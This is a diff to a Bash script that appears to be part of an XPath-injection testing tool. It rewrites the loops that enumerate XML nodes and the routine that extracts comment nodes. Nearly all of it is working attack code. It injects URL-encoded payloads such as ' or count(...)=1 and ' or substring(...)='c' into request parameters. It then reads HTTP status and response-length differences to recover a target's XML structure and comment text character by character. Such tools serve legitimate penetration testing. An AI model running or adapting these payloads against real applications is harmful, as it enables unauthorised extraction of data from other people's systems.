@@ -1232,46 +1232,51 @@ mbuff=""
 iteration=0
 xcount=1
 #((fcount=$fcount+1))
-
+ycount=1
+zcount=2
 rm ./listofxpathelements.txt 2>/dev/null
-
-while [[ $ecount -le $fcount ]] ; do
-	success=0
-	xcount=1
-	while [[ $xcount -le $maxxcount ]] ; do
-		vbuff="%2f%2a%5b$xcount%5d"	
-		xbuff="$obuff""$vbuff"
-
-		rbuff="/*[$xcount]"
-		ybuff="$mbuff""$rbuff"
+while [[ "$ycount" -le "$zcount" ]] ; do
+	if [[ "$ycount" == "$zcount" ]] ; then
+		obuff="%2f%2a%5b1%5d%2f%2a%5b2%5d"
+	fi
+	while [[ $ecount -le $fcount ]] ; do
 		success=0
-		#echo "ecount: $ecount xcount: $xcount"
-		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
-		requester
-		status_true=`echo $response | cut -d ":" -f 1`
-		length_true=`echo $response | cut -d ":" -f 2`								
-			((lendiff=$length_true-$length_false))
-		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-			echo -n "$ybuff " >> ./listofxpathelements.txt
-			mynodecount=$xcount
-			echo -n "$ybuff "
-			success=1 
-		fi
-		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
-			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-				echo -n "$ybuff " >> ./listofxpathelements.txt				
+		xcount=1
+		while [[ $xcount -le $maxxcount ]] ; do
+			vbuff="%2f%2a%5b$xcount%5d"		
+			xbuff="$obuff""$vbuff"
+	
+			rbuff="/*[$xcount]"
+			ybuff="$mbuff""$rbuff"
+			success=0
+			#echo "ecount: $ecount xcount: $xcount"
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`								
+				((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				echo -n "$ybuff " >> ./listofxpathelements.txt
 				mynodecount=$xcount
 				echo -n "$ybuff "
-				success=1
+				success=1 
 			fi
-		fi
-		#commentnodetests
-		nodetests
-		((xcount=$xcount+1))
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+					echo -n "$ybuff " >> ./listofxpathelements.txt				
+					mynodecount=$xcount
+					echo -n "$ybuff "
+					success=1
+				fi
+			fi
+			nodetests
+			((xcount=$xcount+1))
+		done
+		((ecount=$ecount+1))
+		obuff="%2f%2a%5b%31%5d"$obuff
+		mbuff="/*[1]"$mbuff
 	done
-	((ecount=$ecount+1))
-	obuff="%2f%2a%5b%31%5d"$obuff
-	mbuff="/*[1]"$mbuff
+((ycount=$ycount+1))
 done
 }
 
@@ -1341,7 +1346,6 @@ if [[ "$success" == "1" ]] ; then
 		 		((hcount=$hcount+1))
 			done			
 		fi
-		#commentnodetests						
 		# now we get the name of the node
 		if [[ "$stringextract" == "1" ]] ; then
 			icount=1
@@ -1441,8 +1445,9 @@ if [[ "$success" == "1" ]] ; then
 				done
 			((icount=$icount+1))
 			done
+		commentnodetests
 		echo ""
-		echo "" >> ./listofxpathelements.txt 			
+		echo "" >> ./listofxpathelements.txt								 			
 		fi
 	((gcount=$gcount+1))
 	stringlength=0
@@ -1628,132 +1633,102 @@ done
 commentnodetests()
 {
 #test for comment node with /comment()
-if [[ "$success" == "1" ]] ; then
-	egcount=1
-	#one=1
-	#while [[ $egcount -le $maxxcount ]] ; do
-		comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
-		comxbuff="$obuff$comvbuff%29%3d$egcount"				
+#stringextract=0
+#stringlength=0		
+egcount=1
+maxcom=20
+comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
+comxbuff="$obuff$comvbuff%29%3d$egcount"				
+comrbuff="/*[$xcount]/comment()"
+comybuff="$mbuff$comrbuff)=$egcount"
+
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$comxbuff$end"`
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	stringlength=1
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		stringlength=1
+	fi
+fi
+#now we get the length of the content of the comment:
+if [[ "$stringlength" == "1" ]] ; then
+	comhcount=1
+	while [[ $comhcount -le $maxcom ]] ; do
+		#comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
+		#comxbuff="$obuff$comvbuff%29%3d$comhcount"
+		#comxbuff="$obuff%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount"
 
 		comrbuff="/*[$xcount]/comment()"
-		comybuff="$mbuff$comrbuff)=$egcount"
-		#echo "--$ybuff"
-      		                                                    #%27%20%6f%72%20%63%6f%75%6e%74%28$comxbuff%27%61%27%3d%27%62
-		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$comxbuff$end"`
+		comybuff="$mbuff$comrbuff)=$comhcount"			
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount$end"`		
+		#echo $badparams				
 		requester
 		status_true=`echo $response | cut -d ":" -f 1`
 		length_true=`echo $response | cut -d ":" -f 2`
 		((lendiff=$length_true-$length_false))
 		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-			stringlength=1
-			numberofattributes=$egcount
-			#echo "YES $numberofattributes"
+			((comlen=$comhcount))								
+			comhcount=$maxcom
+			stringextract=1
 		fi
 		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-				stringlength=1
-				numberofattributes=$egcount
-				#echo "YES $numberofattributes"
+				((comlen=$comhcount))
+				comhcount=$maxcom
+				stringextract=1
 			fi
 		fi
-
-		#attcount=1
-		#now we get the length of the content of the attribute:
-		if [[ "$stringlength" == "1" ]] ; then
-			#stringlength=0
-			hcount=1
-			while [[ $hcount -le $maxxcount ]] ; do
-				comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
-				comxbuff="$obuff$comvbuff%29%3d$hcount"
-		
-				comrbuff="/*[$xcount]/comment()"
-				comybuff="$mbuff$comrbuff)=$hcount"			
-				#echo $ybuff
-				#' or string-length(                                       $xbuff or 'a'='b
-				#%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28 $xbuff %6f%72%20%27%61%27%3d%27%62
-				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$comxbuff%6f%72%20$end"`		
-				#echo $badparams				
-				requester
-				status_true=`echo $response | cut -d ":" -f 1`
-				length_true=`echo $response | cut -d ":" -f 2`
-					((lendiff=$length_true-$length_false))
-				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-					#echo "$ybuff" >> ./listofxpathelements.txt
-					#((length=$hcount+1))
-					((length=$hcount))								
-					#echo "comment length = $length"
-					hcount=$maxxcount
-					stringextract=1
-				fi
-				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
-					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-						#echo "$ybuff" >> ./listofxpathelements.txt				
-						#((length=$hcount+1))
-						((length=$hcount))
-						#echo "comment length = $length"
-						hcount=$maxxcount
-						stringextract=1
-					fi
-				fi
-		 		((hcount=$hcount+1))
-			done			
-		fi
-		#now we get the content of the comment:
-		if [[ "$stringextract" == "1" ]] ; then
-			#echo "length $length"
-			#stringextract=0
-			icount=1
-			while [[ $icount -le $length ]] ; do
-				for char in `cat ./payloads/alphabet.txt` ; do
-					comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%2c$icount%2c%31%29%3d%27$char%27"
-					comxbuff="$obuff$comvbuff"
-					comrbuff="/*[$xcount]/comment(),$icount,1)='$char'"
-					comybuff="$mbuff$comrbuff"
-					#echo ": $rbuff"	' or substring(name(/*[1]/*[1]/*[1]/*[4]/@*[2]),6,1)='$char' and 'a'='b
-#' or substring(name(                                          /*[$xcount]/@*[$attcount]),$icount,1)='$char' and 'a'='b
-#%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28  $ybuff                                       %20%61%6e%64%20%27%61%27%3d%27%62
-#%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$ybuff%20%61%6e%64%20%27%61%27%3d%27%62
-					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$comxbuff$end"`			
-					#echo $badparams
-					requester
-					status_true=`echo $response | cut -d ":" -f 1`
-					length_true=`echo $response | cut -d ":" -f 2`
-					((lendiff=$length_true-$length_false))
-					if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-						#echo "$ybuff" >> ./listofxpathelements.txt
-						if [[ $icount == 1 ]] ; then
-							echo -n "Comment: "
-						fi
-						echo -n "$char"
-						break
-					fi
-					if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
-						if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-							if [[ $icount == 1 ]] ; then
-								echo -n "Comment: "	
-							fi
-							#echo "$ybuff" >> ./listofxpathelements.txt				
-							echo -n "$char"
-							break
-						fi
-					fi
-				done
-			#echo "increment icount"
-			((icount=$icount+1))
-			done
-			#if [[ $egcount == $numberofattributes ]] ; then
-				echo -n ' '
-			#elif [[ $attcount -le $numberofattributes ]] ; then
-			#	echo -n '"'
-			#fi
-		fi			
-	#done
-#((egcount=$egcount+1))
-###end of attribute string length and extraction loop##
-#stringlength=0
-#stringextract=0
+ 		((comhcount=$comhcount+1))
+	done			
 fi
-#echo "test"
+#now we get the content of the comment:
+if [[ "$stringextract" == "1" ]] ; then
+	#echo "length: $length"
+	comicount=1
+	while [[ "$comicount" -le "$comlen" ]] ; do
+		for char in `cat ./payloads/alphabet.txt` ; do
+			comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27$char%27"
+			comxbuff="$obuff$comvbuff"
+			comrbuff="/*[$xcount]/comment(),$comicount,1)='$char'"
+			comybuff="$mbuff$comrbuff"
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$comxbuff$end"`			
+			#echo $badparams
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`
+			((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $comicount == 1 ]] ; then
+					echo -n "Comment: "
+					echo -n "Comment: " >> ./listofxpathelements.txt	
+					
+				fi
+				echo -n "$char"
+				echo -n "$char" >> ./listofxpathelements.txt	
+				break
+			fi
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+					if [[ $comicount == 1 ]] ; then
+						echo -n "Comment: "
+						echo -n "Comment: " >> ./listofxpathelements.txt	
+					fi
+					echo -n "$char"
+					echo -n "$char" >> ./listofxpathelements.txt	
+					break
+				fi
+			fi
+		done
+	((comicount=$comicount+1))
+	done
+	#echo -n ' '
+	#echo -n ' ' >> ./listofxpathelements.txt
+fi			
 #thats it for comment nodes		
 }
 
